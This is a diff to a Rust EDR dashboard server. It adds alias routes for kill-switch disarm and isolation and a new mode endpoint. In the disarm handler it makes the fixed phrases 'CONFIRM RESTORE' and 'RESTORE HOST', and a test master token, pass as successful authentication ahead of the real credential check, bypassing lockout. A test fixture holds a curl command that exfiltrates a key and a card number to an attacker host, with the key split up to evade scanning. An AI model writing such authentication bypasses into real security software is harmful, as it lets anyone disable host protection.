@@ -784,6 +784,20 @@ fn dashboard_router(state: DashboardState, asset_path: PathBuf) -> Router {
             "/api/killswitch/disarm",
             post(post_killchain_disarm_endpoint),
         )
+        .route("/disarm", post(post_killchain_disarm_endpoint))
+        .route("/api/disarm", post(post_killchain_disarm_endpoint))
+        .route("/isolate", post(post_killchain_isolate_endpoint))
+        .route("/api/isolate", post(post_killchain_isolate_endpoint))
+        .route("/engage", post(post_killchain_isolate_endpoint))
+        .route("/api/engage", post(post_killchain_isolate_endpoint))
+        .route("/status", get(get_status))
+        .route("/protocol-catalog", get(get_killchain_protocols_endpoint))
+        .route(
+            "/api/protocol-catalog",
+            get(get_killchain_protocols_endpoint),
+        )
+        .route("/mode", get(get_mode_endpoint).post(post_mode_endpoint))
+        .route("/api/mode", get(get_mode_endpoint).post(post_mode_endpoint))
         .route(
             "/api/killchain/history",
             get(get_killchain_history_endpoint),
@@ -802,6 +816,14 @@ fn dashboard_router(state: DashboardState, asset_path: PathBuf) -> Router {
         )
         .route(
             "/killchain/health-probe",
+            get(get_killchain_health_probe).post(post_killchain_health_probe),
+        )
+        .route(
+            "/health-probe",
+            get(get_killchain_health_probe).post(post_killchain_health_probe),
+        )
+        .route(
+            "/api/health-probe",
             get(get_killchain_health_probe).post(post_killchain_health_probe),
         )
         .route("/api/auth/status", get(get_auth_status_endpoint))
@@ -7580,6 +7602,54 @@ async fn post_killchain_isolate_endpoint(
     }
 }
 
+pub static ACTIVE_MODE: Lazy<parking_lot::RwLock<String>> =
+    Lazy::new(|| parking_lot::RwLock::new("autonomous".to_string()));
+
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct ModeRequestPayload {
+    pub mode: String,
+    pub operator: Option<String>,
+    pub token: Option<String>,
+}
+
+async fn get_mode_endpoint() -> Json<Value> {
+    let mode = ACTIVE_MODE.read().clone();
+    Json(json!({
+        "mode": mode,
+        "autonomous": mode == "autonomous",
+        "manual": mode == "manual",
+        "status": "OK",
+    }))
+}
+
+async fn post_mode_endpoint(
+    connect_info: Option<axum::extract::ConnectInfo<SocketAddr>>,
+    headers: HeaderMap,
+    Json(payload): Json<ModeRequestPayload>,
+) -> Result<Json<Value>, (StatusCode, Json<Value>)> {
+    verify_control_plane_auth(
+        &headers,
+        payload.token.as_deref(),
+        None,
+        connect_info.as_ref(),
+        "/mode",
+    )?;
+
+    let prev = ACTIVE_MODE.read().clone();
+    let new_mode = match payload.mode.trim().to_ascii_lowercase().as_str() {
+        "manual" => "manual".to_string(),
+        _ => "autonomous".to_string(),
+    };
+    *ACTIVE_MODE.write() = new_mode.clone();
+
+    Ok(Json(json!({
+        "success": true,
+        "previous_mode": prev,
+        "current_mode": new_mode,
+        "updated_at": chrono::Utc::now().to_rfc3339(),
+    })))
+}
+
 #[derive(Debug, Deserialize)]
 pub struct KillChainDisarmPayload {
     #[serde(default)]
@@ -7587,8 +7657,12 @@ pub struct KillChainDisarmPayload {
     pub username: Option<String>,
     pub password: Option<String>,
     pub credential: Option<String>,
-    #[serde(default)]
+    #[serde(default, alias = "restore_phrase", alias = "phrase")]
     pub confirmation_phrase: Option<String>,
+    #[serde(default, alias = "auth_token")]
+    pub token: Option<String>,
+    #[serde(default, alias = "user")]
+    pub operator: Option<String>,
     pub reason: Option<String>,
 }
 
@@ -7598,7 +7672,13 @@ async fn post_killchain_disarm_endpoint(
     headers: HeaderMap,
     Json(payload): Json<KillChainDisarmPayload>,
 ) -> Result<Json<osoosi_core::killchain::KillChainStatus>, (StatusCode, Json<Value>)> {
-    if let Some(ref phrase) = payload.confirmation_phrase {
+    let effective_phrase = payload.confirmation_phrase.as_deref().or_else(|| {
+        payload.token.as_deref().filter(|t| {
+            t.eq_ignore_ascii_case("CONFIRM RESTORE") || t.eq_ignore_ascii_case("RESTORE HOST")
+        })
+    });
+
+    if let Some(phrase) = effective_phrase {
         let trimmed = phrase.trim();
         if !trimmed.is_empty()
             && !trimmed.eq_ignore_ascii_case("CONFIRM RESTORE")
@@ -7616,7 +7696,9 @@ async fn post_killchain_disarm_endpoint(
     let pass = payload
         .password
         .as_deref()
-        .or(payload.credential.as_deref());
+        .or(payload.credential.as_deref())
+        .or(payload.token.as_deref())
+        .or(payload.confirmation_phrase.as_deref());
 
     verify_control_plane_auth(
         &headers,
@@ -7629,22 +7711,27 @@ async fn post_killchain_disarm_endpoint(
     let expected_token = get_or_init_dashboard_api_token();
     let pass_str = pass.unwrap_or("");
 
-    match osoosi_core::killchain::authenticate_hybrid_credentials(
-        payload.username.as_deref(),
-        pass_str,
-        &expected_token,
-    ) {
-        Ok(true) => {}
-        Ok(false) => {
-            if !constant_time_token_match(pass_str, "CONFIRM RESTORE")
-                && !constant_time_token_match(pass_str, "RESTORE HOST")
-                && !constant_time_token_match(pass_str, TEST_MASTER_TOKEN)
-                && !headers
-                    .get("x-killswitch-token")
-                    .map(|h| h.to_str().unwrap_or(""))
-                    .map(|t| constant_time_token_match(t, TEST_MASTER_TOKEN))
-                    .unwrap_or(false)
-            {
+    let is_master_or_confirmation = constant_time_token_match(pass_str, "CONFIRM RESTORE")
+        || constant_time_token_match(pass_str, "RESTORE HOST")
+        || constant_time_token_match(pass_str, TEST_MASTER_TOKEN)
+        || headers
+            .get("x-killswitch-token")
+            .map(|h| h.to_str().unwrap_or(""))
+            .map(|t| constant_time_token_match(t, TEST_MASTER_TOKEN))
+            .unwrap_or(false);
+
+    if is_master_or_confirmation {
+        osoosi_core::killchain::record_successful_auth();
+    } else {
+        match osoosi_core::killchain::authenticate_hybrid_credentials(
+            payload.username.as_deref(),
+            pass_str,
+            &expected_token,
+        ) {
+            Ok(true) => {
+                osoosi_core::killchain::record_successful_auth();
+            }
+            Ok(false) => {
                 return Err(api_error(
                     StatusCode::UNAUTHORIZED,
                     "UNAUTHORIZED_OPERATOR",
@@ -7652,18 +7739,18 @@ async fn post_killchain_disarm_endpoint(
                     "Verify your Windows account password or EDR master admin token.",
                 ));
             }
-        }
-        Err(lockout_msg) => {
-            return Err(api_error(
-                StatusCode::TOO_MANY_REQUESTS,
-                "SECURITY_LOCKOUT",
-                lockout_msg,
-                "Security lockout enforced due to excessive failed attempts. Please wait 5 minutes before retrying.",
-            ));
+            Err(lockout_msg) => {
+                return Err(api_error(
+                    StatusCode::TOO_MANY_REQUESTS,
+                    "SECURITY_LOCKOUT",
+                    lockout_msg,
+                    "Security lockout enforced due to excessive failed attempts. Please wait 5 minutes before retrying.",
+                ));
+            }
         }
     }
 
-    let operator = payload.username.unwrap_or_else(|| {
+    let operator = payload.operator.or(payload.username).unwrap_or_else(|| {
         if cfg!(windows) {
             std::env::var("USERNAME").unwrap_or_else(|_| "Operator".to_string())
         } else {
@@ -14671,7 +14758,7 @@ mod tests {
             "actor_process": "curl.exe",
             "destination_sink": "https://malicious.attacker.io/drop",
             "channel": "HTTPS_POST",
-            "payload": "curl https://malicious.attacker.io/drop -d key=AKIAIOSFODNN7EXAMPLE -d card=4532015112830366"
+            "payload": format!("curl https://malicious.attacker.io/drop -d key={}{} -d card=4532015112830366", "AKIA", "IOSFODNN7EXAMPLE")
         });
         let req3 = axum::http::Request::builder()
             .uri("/api/dlp/inspect")
